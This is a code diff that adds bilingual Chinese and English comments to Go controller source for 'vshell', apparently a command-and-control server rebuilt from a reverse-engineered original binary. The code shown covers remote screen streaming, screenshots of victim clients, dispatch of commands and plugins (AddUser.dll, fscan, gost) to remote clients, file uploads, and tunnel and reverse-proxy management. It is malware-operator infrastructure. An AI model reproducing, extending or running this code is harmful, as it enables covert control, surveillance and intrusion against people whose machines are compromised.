@@ -12,12 +12,14 @@ import (
 	"vshell/utils"
 )
 
-// TunnelController handles tunnel/proxy management
+// TunnelController 处理隧道/代理管理。
+// TunnelController handles tunnel/proxy management.
 type TunnelController struct {
 	BaseController
 }
 
-// Get lists all tunnels
+// Get 列出全部隧道。
+// Get lists all tunnels.
 func (c *TunnelController) Get() {
 	engine := c2engine.GetEngine()
 	tunnels := engine.GetTunnelList()
@@ -40,7 +42,8 @@ func (c *TunnelController) Get() {
 	c.JSONOk(paginatedResult(result, len(result)))
 }
 
-// Post creates a new tunnel
+// Post 创建新隧道。
+// Post creates a new tunnel.
 func (c *TunnelController) Post() {
 	port, _ := c.GetInt("port", 8080)
 	mode := c.GetString("mode", "tcp")
@@ -64,7 +67,8 @@ func (c *TunnelController) Post() {
 	})
 }
 
-// Delete removes a tunnel
+// Delete 删除隧道。
+// Delete removes a tunnel.
 func (c *TunnelController) Delete() {
 	id, _ := c.GetInt64("id")
 	engine := c2engine.GetEngine()
@@ -75,18 +79,21 @@ func (c *TunnelController) Delete() {
 	c.JSONOk(map[string]interface{}{"deleted_id": id})
 }
 
-// Put updates tunnel configuration
+// Put 更新隧道配置。
+// Put updates tunnel configuration.
 func (c *TunnelController) Put() {
 	id, _ := c.GetInt64("id")
 	c.JSONOk(map[string]interface{}{"updated_id": id})
 }
 
-// HostController handles reverse proxy host management
+// HostController 处理反向代理 Host 管理。
+// HostController handles reverse proxy host management.
 type HostController struct {
 	BaseController
 }
 
-// Get lists all reverse proxy hosts
+// Get 列出全部反向代理 Host（附带在线状态）。
+// Get lists all reverse proxy hosts (with online status).
 func (c *HostController) Get() {
 	engine := c2engine.GetEngine()
 	hosts := engine.GetHostList()
@@ -110,7 +117,8 @@ func (c *HostController) Get() {
 	c.JSONOk(paginatedResult(result, len(result)))
 }
 
-// Post creates a new reverse proxy host
+// Post 创建新的反向代理 Host。
+// Post creates a new reverse proxy host.
 func (c *HostController) Post() {
 	var req struct {
 		ClientID  int64  `json:"client_id"`
@@ -155,7 +163,8 @@ func (c *HostController) Post() {
 	})
 }
 
-// Delete removes a reverse proxy host
+// Delete 删除反向代理 Host。
+// Delete removes a reverse proxy host.
 func (c *HostController) Delete() {
 	id, _ := c.GetInt64("id")
 	engine := c2engine.GetEngine()
@@ -166,7 +175,8 @@ func (c *HostController) Delete() {
 	c.JSONOk(map[string]interface{}{"deleted_id": id})
 }
 
-// Put updates a host's configuration
+// Put 更新 Host 配置。
+// Put updates a host's configuration.
 func (c *HostController) Put() {
 	id, _ := c.GetInt64("id")
 	host := c.GetString("host")
@@ -197,7 +207,8 @@ func (c *HostController) Put() {
 	c.JSONOk(existing)
 }
 
-// Start activates the reverse proxy for this host
+// Start 启动该 Host 的反向代理。
+// Start activates the reverse proxy for this host.
 func (c *HostController) Start() {
 	id, _ := c.GetInt64("id")
 	engine := c2engine.GetEngine()
@@ -231,7 +242,8 @@ func (c *HostController) Start() {
 	})
 }
 
-// Stop deactivates the reverse proxy for this host
+// Stop 停止该 Host 的反向代理。
+// Stop deactivates the reverse proxy for this host.
 func (c *HostController) Stop() {
 	id, _ := c.GetInt64("id")
 	if err := tunnelMgr.StopHostProxy(id); err != nil {
@@ -244,12 +256,14 @@ func (c *HostController) Stop() {
 	})
 }
 
-// SettingController handles application settings
+// SettingController 处理应用设置。
+// SettingController handles application settings.
 type SettingController struct {
 	BaseController
 }
 
-// Get returns current settings
+// Get 返回当前设置（仅通知相关配置，与原版一致）。
+// Get returns current settings (notification config only, matching the original).
 func (c *SettingController) Get() {
 	cfg := utils.GetFullSettings()
 	// The original binary returns ONLY the notification settings here:
@@ -263,7 +277,8 @@ func (c *SettingController) Get() {
 	})
 }
 
-// Post updates settings (JSON body or form-encoded)
+// Post 更新设置（支持 JSON 请求体或表单）。
+// Post updates settings (JSON body or form-encoded).
 func (c *SettingController) Post() {
 	var updates map[string]interface{}
 	if !parseJSONBody(c.Ctx.Request, &updates) {
@@ -299,19 +314,22 @@ func (c *SettingController) Post() {
 	c.JSONOk(map[string]string{"message": "settings saved"})
 }
 
-// ScreenController handles remote screen viewing
+// ScreenController 处理远程屏幕查看。
+// ScreenController handles remote screen viewing.
 type ScreenController struct {
 	BaseController
 }
 
-// Get renders the screen viewer page
+// Get 渲染屏幕查看页面。
+// Get renders the screen viewer page.
 func (c *ScreenController) Get() {
 	clientID := c.GetString("client_id")
 	c.Data["client_id"] = clientID
 	c.Render("screen.html")
 }
 
-// Ws handles WebSocket screen streaming (matching original binary ScreenController.Ws)
+// Ws 处理 WebSocket 屏幕流（对应原版 ScreenController.Ws）。
+// Ws handles WebSocket screen streaming (matching original binary ScreenController.Ws).
 func (c *ScreenController) Ws() {
 	clientID, _ := c.GetInt64("client_id")
 	quality, _ := c.GetInt("quality", 50)
@@ -335,12 +353,14 @@ func (c *ScreenController) Ws() {
 	})
 }
 
-// ScreenshotController handles remote screenshots
+// ScreenshotController 处理远程截图。
+// ScreenshotController handles remote screenshots.
 type ScreenshotController struct {
 	BaseController
 }
 
-// Get takes a screenshot from the client (matching original binary ScreenshotController.Get)
+// Get 从客户端截取屏幕（对应原版 ScreenshotController.Get）。
+// Get takes a screenshot from the client (matching original binary ScreenshotController.Get).
 func (c *ScreenshotController) Get() {
 	clientID, _ := c.GetInt64("client_id")
 
@@ -358,12 +378,14 @@ func (c *ScreenshotController) Get() {
 	})
 }
 
-// RunnerController handles command execution on clients
+// RunnerController 处理在客户端上的命令/插件执行。
+// RunnerController handles command execution on clients.
 type RunnerController struct {
 	BaseController
 }
 
-// Post creates a command and dispatches it to a client
+// Post 创建命令并派发给客户端。
+// Post creates a command and dispatches it to a client.
 func (c *RunnerController) Post() {
 	var req struct {
 		ClientID int64  `json:"client_id"`
@@ -403,7 +425,8 @@ func (c *RunnerController) Post() {
 	})
 }
 
-// Get returns command execution results
+// Get 返回命令执行结果（按 id 或 client_id）。
+// Get returns command execution results (by id or client_id).
 func (c *RunnerController) Get() {
 	id, _ := c.GetInt64("id")
 	clientID, _ := c.GetInt64("client_id")
@@ -441,6 +464,10 @@ func (c *RunnerController) Get() {
 	c.Error("Specify id or client_id")
 }
 
+// List 返回服务器上可用的插件列表（GET /api/runner/list）。
+// 原版二进制：nTApp6jPzv.(*RunnerController).List @ 0x1dcd49eb
+// 原版前端的 runner 页面将其作为插件选择器消费，后端对 plugins/ 目录下
+// 每个文件返回 [{id, name}]（如 AddUser.dll、fscan.x64.elf、gost.x64.exe 等）。
 // List returns the list of plugins available on the server (GET /api/runner/list).
 // Original binary: nTApp6jPzv.(*RunnerController).List @ 0x1dcd49eb
 // The original frontend's runner page consumes this as a plugin picker:
@@ -470,6 +497,7 @@ func (c *RunnerController) List() {
 	c.JSONOk(result)
 }
 
+// RunPlugin 通过 runner 页面将插件派发到远程客户端执行。
 // RunPlugin dispatches a plugin to run on a remote client via the runner page.
 // Pclntab: nTApp6jPzv.(*RunnerController).RunPlugin @ 0x1dcd4a0f
 func (c *RunnerController) RunPlugin() {
@@ -545,6 +573,7 @@ func (c *RunnerController) RunPlugin() {
 	})
 }
 
+// Upload 通过 runner 页面派发文件上传命令到远程客户端（也支持本地上传）。
 // Upload dispatches a file upload command to a remote client via the runner page.
 // Pclntab: nTApp6jPzv.(*RunnerController).Upload @ 0x1dcd4a38
 func (c *RunnerController) Upload() {
@@ -616,12 +645,16 @@ func (c *RunnerController) Upload() {
 // Frontend: POST /api/tunnel/{action}
 // ============================================================================
 
+// 以下为隧道 REST 风格 action（对应原版前端路径 /api/tunnel/{action}）。
+// REST-style action aliases for Tunnel (matching original frontend paths).
 func (c *TunnelController) Add()    { c.Post() }
 func (c *TunnelController) Edit()   { c.Put() }
 func (c *TunnelController) Del()    { c.Delete() }
 func (c *TunnelController) List()   { c.Get() }
 
-// Dellist deletes multiple tunnels by ID list
+// Dellist 按 ID 列表批量删除隧道。
+// DelList 是原版批量删除方法名，Dellist 为路由别名。
+// Dellist deletes multiple tunnels by ID list.
 // DelList is the original binary's method name for batch delete
 // (nTApp6jPzv.(*TunnelController).DelList); Dellist is the router alias.
 func (c *TunnelController) DelList() { c.Dellist() }
@@ -641,7 +674,8 @@ func (c *TunnelController) Dellist() {
 	c.JSONOk(map[string]interface{}{"deleted": deleted})
 }
 
-// EditRemark updates tunnel remark only
+// EditRemark 仅更新隧道备注。
+// EditRemark updates tunnel remark only.
 func (c *TunnelController) EditRemark() {
 	id, _ := c.GetInt64("id")
 	remark := c.GetString("remark")
@@ -654,7 +688,8 @@ func (c *TunnelController) EditRemark() {
 	c.JSONOk(tunnel)
 }
 
-// Start activates a tunnel (matches /api/tunnel/start)
+// Start 激活隧道（对应 /api/tunnel/start）。
+// Start activates a tunnel (matches /api/tunnel/start).
 func (c *TunnelController) Start() {
 	id, _ := c.GetInt64("id")
 	engine := c2engine.GetEngine()
@@ -666,7 +701,8 @@ func (c *TunnelController) Start() {
 	c.JSONOk(map[string]interface{}{"started_id": id, "status": "activated"})
 }
 
-// Stop deactivates a tunnel (matches /api/tunnel/stop)
+// Stop 停用隧道（对应 /api/tunnel/stop）。
+// Stop deactivates a tunnel (matches /api/tunnel/stop).
 func (c *TunnelController) Stop() {
 	id, _ := c.GetInt64("id")
 	engine := c2engine.GetEngine()
@@ -682,6 +718,7 @@ func (c *TunnelController) Stop() {
 // REST-style action methods for Host (matching original frontend paths)
 // ============================================================================
 
+// 以下为 Host 的 REST 风格 action 别名 / REST-style action aliases for Host.
 func (c *HostController) Add()    { c.Post() }
 func (c *HostController) Edit()   { c.Put() }
 func (c *HostController) Del()    { c.Delete() }
@@ -691,15 +728,18 @@ func (c *HostController) List()   { c.Get() }
 // REST-style action methods for Client (matching original frontend paths)
 // ============================================================================
 
+// 以下为 Client 的 REST 风格 action 别名 / REST-style action aliases for Client.
 func (c *ClientController) Add() { c.CheckIn() }
 
-// EditRemark updates client remark (matches /api/client/editremark)
+// EditRemark 更新客户端备注（对应 /api/client/editremark）。
+// EditRemark updates client remark (matches /api/client/editremark).
 func (c *ClientController) EditRemark() {
 	id, _ := c.GetInt64("id")
 	remark := c.GetString("remark")
 	c.JSONOk(map[string]interface{}{"client_id": id, "remark": remark})
 }
 
+// updateConfig 通过 utils.UpdateConfig 应用部分配置更新，连接控制器层与配置持久化层。
 // updateConfig applies partial updates via utils.UpdateConfig.
 // This bridges the controller layer with the config persistence layer.
 func updateConfig(updates map[string]interface{}) error {
